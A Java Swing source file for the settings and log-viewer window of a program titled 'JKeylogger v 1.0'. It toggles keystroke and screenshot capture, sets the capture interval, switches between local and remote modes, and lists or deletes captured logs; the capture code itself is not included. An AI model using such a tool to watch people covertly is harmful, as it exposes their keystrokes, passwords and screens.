package gui;

import io.LogFile;

import java.io.File;
import java.util.StringTokenizer;

import javax.swing.JComboBox;
import javax.swing.JList;
import javax.swing.JSlider;
import static debug.DebugSettings.debug;
import keylog.KeyLogger;


public class SettingsPanel extends javax.swing.JFrame {

    /**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private boolean CaptureScreen;
    private boolean CaptureKeyboard;
    private boolean RunLocally;
    
    private String ScreenSeconds;
    private String Screen;
    
    
    private String FileSelection;
    
    
    /** Creates new form SettingsPanel */
    public SettingsPanel() {
        initComponents();
        CaptureScreen = false;
        CaptureKeyboard = false;
        
        io.File f = new io.File("conf");
        String sel=null;
        
        if (f.Exists()){
        	sel = f.Read();
        	StringTokenizer st = new StringTokenizer(sel,"#");
        	if (st.nextToken().equals("Local"))
        		WindowEventHandler.SetMode(KeyLogger.MODE_LOCAL);
        	else
        		WindowEventHandler.SetMode(KeyLogger.MODE_REMOTE);        		
        	String t = st.nextToken();
        	
        	String scr = st.nextToken();
        	
        	String keyCap = st.nextToken();
        	keyCap = keyCap.substring(0, keyCap.length()-1);
        	if (keyCap.equals("true")){
        		debug("Keyboard capture is on.");
        		jCheckBox2.setSelected(true);        		
        		CaptureKeyboard = true;
        		WindowEventHandler.SetKeyboardCapture(true);
        	}//keyboard capture is on
        	else{
        		CaptureKeyboard = false;
        		debug("Keyboard capture is off.");  
        		jCheckBox2.setSelected(false);
        		WindowEventHandler.SetKeyboardCapture(false);
        	}
        	
        	Screen = scr;
        	
        	if (scr.equals("3")){
        		debug("screen Checkbox and Slider enabled from settings");
        		jCheckBox1.setSelected(true);
        		jSlider1.setEnabled(true);
                jLabel2.setEnabled(true);
                jLabel3.setEnabled(true);
                CaptureScreen = true;
                WindowEventHandler.SetScreenMode(KeyLogger.SCREEN_MODE_ON);
        	}
        	else{
        		debug("screen Checkbox and Slider disabled from settings");
        		jCheckBox1.setSelected(false);
        		jSlider1.setEnabled(false);
                jLabel2.setEnabled(false);
                jLabel3.setEnabled(false);
                CaptureScreen = false;
                WindowEventHandler.SetScreenMode(KeyLogger.SCREEN_MODE_OFF);
        	}
        	debug(t);
        	
        	if (!t.equals("0")){
        		jLabel3.setText(t);
        		ScreenSeconds = t;
        		jSlider1.setValue(Integer.parseInt(t));
        	}
        	else{
        		jLabel3.setText("60 seconds");		
                jLabel2.setEnabled(false);
                jLabel3.setEnabled(false);
                CaptureScreen = false;
        	}

        }//if
        else{
        	jLabel3.setText("60 seconds");
            jSlider1.setEnabled(false);
            jLabel2.setEnabled(false);
            jLabel3.setEnabled(false);
            CaptureScreen = false;
        }

        jSlider1.setMaximum(3600);
        jSlider1.setMinimum(30);
        
        RunLocally = true;
        
        jTextArea1.setEnabled(false);
        
        java.io.File dir = new java.io.File("logs");
        dir.mkdirs();
        
        final String[] files = dir.list();
        
        jList1.setModel(new javax.swing.AbstractListModel() {
        
        
        	
        String[] strings = files;
        public int getSize() { return strings.length; }
        public Object getElementAt(int i) { return strings[i]; }
        }); 
        
        
        jList1.addListSelectionListener(new javax.swing.event.ListSelectionListener() {
            public void valueChanged(javax.swing.event.ListSelectionEvent evt) {
                jList1ValueChanged(evt);
            }
        });
        
        
        SettingsPanel.this.addWindowListener(new WindowEventHandler());
    }

    /** This method is called from within the constructor to
     * initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is
     * always regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">
    private void initComponents() {

        jLabel1 = new javax.swing.JLabel();
        jCheckBox1 = new javax.swing.JCheckBox();
        
        
        
        jCheckBox2 = new javax.swing.JCheckBox();
        jLabel2 = new javax.swing.JLabel();
        jLabel3 = new javax.swing.JLabel();
        jSlider1 = new javax.swing.JSlider();
        jLabel4 = new javax.swing.JLabel();
        jComboBox1 = new javax.swing.JComboBox();
        jScrollPane1 = new javax.swing.JScrollPane();
        jList1 = new javax.swing.JList();
        jScrollPane2 = new javax.swing.JScrollPane();
        jTextArea1 = new javax.swing.JTextArea();
        label1 = new java.awt.Label();
        jButton1 = new javax.swing.JButton();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        jLabel1.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N
        jLabel1.setText("JKeylogger v 1.0");

        jCheckBox1.setText("Capture Screen");
        

        
        
        jCheckBox1.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jCheckBox1MouseClicked(evt);
            }
        });
        jButton1.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jButton1MouseClicked(evt);
            }
        });
        
        
        jCheckBox1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jCheckBox1ActionPerformed(evt);
            }
        });

        jCheckBox2.setText("Capture Keyboard");
        jCheckBox2.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jCheckBox2MouseClicked(evt);
            }
        });

        jLabel2.setText("every");
        jSlider1.setMaximum(3600);
        jSlider1.setMinimum(30);

        jLabel3.setText(ScreenSeconds+" seconds");

        jSlider1.addChangeListener(new javax.swing.event.ChangeListener() {
            public void stateChanged(javax.swing.event.ChangeEvent evt) {
                jSlider1StateChanged(evt);
            }
        });

        jLabel4.setText("Mode : ");

        jComboBox1.setModel(new javax.swing.DefaultComboBoxModel(new String[] { "Local", "Remote" }));
        
        io.File f = new io.File("conf");
        String sel=null;
        
        if (f.Exists())
        	sel = f.Read();
        
        if (sel != null){
            StringTokenizer st = new StringTokenizer(sel,"#");
        	jComboBox1.setSelectedItem(st.nextToken());
        }
        jComboBox1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jComboBox1ActionPerformed(evt);
            }
        });

        jList1.setModel(new javax.swing.AbstractListModel() {
            String[] strings = {};
            public int getSize() { return strings.length; }
            public Object getElementAt(int i) { return strings[i]; }
        });
        jScrollPane1.setViewportView(jList1);

        jTextArea1.setColumns(20);
        jTextArea1.setRows(5);
        jScrollPane2.setViewportView(jTextArea1);

        label1.setFont(new java.awt.Font("Dialog", 1, 12)); // NOI18N
        label1.setName(""); // NOI18N
        label1.setText("Log Viewer");

        jButton1.setText("Delete");

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addContainerGap()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(layout.createSequentialGroup()
                                .addComponent(jCheckBox1)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(jLabel2)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                                .addComponent(jLabel3))
                            .addComponent(jCheckBox2)
                            .addGroup(layout.createSequentialGroup()
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                                    .addComponent(jScrollPane1, javax.swing.GroupLayout.Alignment.LEADING, 0, 0, Short.MAX_VALUE)
                                    .addGroup(javax.swing.GroupLayout.Alignment.LEADING, layout.createSequentialGroup()
                                        .addComponent(jLabel4)
                                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                                        .addComponent(jComboBox1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(jButton1)))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 11, Short.MAX_VALUE)
                        .addComponent(jScrollPane2, javax.swing.GroupLayout.DEFAULT_SIZE, 368, Short.MAX_VALUE))
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(jSlider1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(149, 149, 149)
                        .addComponent(label1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap())
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addContainerGap(215, Short.MAX_VALUE)
                .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 151, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(206, 206, 206))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addComponent(jLabel1)
                .addGap(26, 26, 26)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(jSlider1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(label1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jCheckBox1)
                            .addComponent(jLabel2)
                            .addComponent(jLabel3))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(jCheckBox2)
                        .addGap(18, 18, 18)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jLabel4)
                            .addComponent(jComboBox1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 55, Short.MAX_VALUE)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jButton1)
                            .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                    .addComponent(jScrollPane2, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 272, Short.MAX_VALUE))
                .addGap(11, 11, 11))
        );

        pack();
    }// </editor-fold>

private void jCheckBox1ActionPerformed(java.awt.event.ActionEvent evt) {
// TODO add your handling code here:
}

private void jCheckBox1MouseClicked(java.awt.event.MouseEvent evt) {
    
    if (CaptureScreen){
        jLabel2.setEnabled(false);
        jLabel3.setEnabled(false);
        jSlider1.setEnabled(false);
        WindowEventHandler.SetScreenMode(KeyLogger.SCREEN_MODE_OFF);
    }
    else{
        jLabel2.setEnabled(true);
        jLabel3.setEnabled(true);
        jSlider1.setEnabled(true);        
        WindowEventHandler.SetScreenMode(KeyLogger.SCREEN_MODE_ON);
    }
    CaptureScreen = !CaptureScreen;
}

private void jCheckBox2MouseClicked(java.awt.event.MouseEvent evt) {
    if (CaptureKeyboard){
        WindowEventHandler.SetKeyboardCapture(false);
        debug("Set keyboard capture to false");
    }
    else{
        debug("Set keyboard capture to true");
        WindowEventHandler.SetKeyboardCapture(true);        
    }
    CaptureKeyboard = !CaptureKeyboard;
}

private void jList1ValueChanged(javax.swing.event.ListSelectionEvent evt) {
    JList list = (JList)evt.getSource();
    String selection = (String)list.getSelectedValue();
    
    if (selection != null){
    	FileSelection = selection;
    	jTextArea1.setEnabled(true);
    	
    	File dir = new File("logs");
    	LogFile lg = new LogFile(dir.getAbsolutePath()+"\\"+FileSelection);
    	String text = lg.Read();
    	String textLines="";
    	
    	for(int i=0;i<text.length();i++){
    		textLines+= text.charAt(i);
    		//if (i%50 == 0)
    		//	textLines+="\n";
    	}//for
    	
    	jTextArea1.setText(textLines);
    }
    
}

private void jButton1MouseClicked(java.awt.event.MouseEvent evt) {
    
	if (FileSelection != null){
		File dir = new File("logs");
		dir.mkdir();
		
		File f = new File(dir.getAbsolutePath()+"\\"+FileSelection);
		f.delete();

        final String[] files = dir.list();
        
        jList1.setModel(new javax.swing.AbstractListModel() {
        
        	
        String[] strings = files;
        public int getSize() { return strings.length; }
        public Object getElementAt(int i) { return strings[i]; }
        }); 		
		
	}
    
}

private void jComboBox1ActionPerformed(java.awt.event.ActionEvent evt) {

    JComboBox b = (JComboBox)evt.getSource();
    String value = (String) b.getSelectedItem();
    debug("JComboBox: Selected "+value);
    
    if (value.equals("Remote")){
        RunLocally = false;
        WindowEventHandler.SetMode(KeyLogger.MODE_REMOTE);
    }//Remote
    else{
        RunLocally = true;
        WindowEventHandler.SetMode(KeyLogger.MODE_LOCAL);
    }//else localy
}

private void jSlider1StateChanged(javax.swing.event.ChangeEvent evt) {
    JSlider js = (JSlider)evt.getSource();
       jLabel3.setText(js.getValue()+ "seconds");
       WindowEventHandler.SetScreenshotInterval(js.getValue());//update selection
}

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(SettingsPanel.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(SettingsPanel.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(SettingsPanel.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(SettingsPanel.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {

            public void run() {
                new SettingsPanel().setVisible(true);
            }
        });
    }
    // Variables declaration - do not modify
    private javax.swing.JButton jButton1;
    private javax.swing.JCheckBox jCheckBox1;
    private javax.swing.JCheckBox jCheckBox2;
    private javax.swing.JComboBox jComboBox1;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JList jList1;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JSlider jSlider1;
    private javax.swing.JTextArea jTextArea1;
    private java.awt.Label label1;
    // End of variables declaration
}